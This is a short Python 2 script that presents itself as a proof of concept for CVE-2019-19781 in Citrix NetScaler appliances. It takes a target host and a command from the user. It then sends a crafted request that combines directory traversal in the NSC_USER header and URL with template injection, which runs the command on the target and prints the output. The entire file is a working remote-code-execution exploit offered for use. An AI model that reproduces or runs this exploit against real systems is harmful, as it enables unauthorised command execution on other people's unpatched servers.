import requests
print '------------------------------------------------------------'
print '[+] POC for CVE-2019-19781 using rmbm.pl[+]'
print '[+] POC only. no reverse shell yet [+]'
print '------------------------------------------------------------'

url = raw_input('Enter the url without http/https:\n')
cmd = raw_input('Enter the command to execute:\n')
headerss={
"Host": url,
"NSC_USER":"../../../../netscaler/portal/templates/gggg[%template.new({'BLOCK'='print`cmd`'})%]",
"NSC_NONCE":"gggg",
"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
"Cookie":"pwcount=2"
}

res = requests.get("https://"+url+"/vpn/../vpns/portal/gggg[%25template.new({'BLOCK'%3d'print`"+cmd+"`'})%25].xml",headers=headerss)
if res:
	print('The website is responsive. got 200\n')
	print(res.text)
else:
	print('Response Failed')

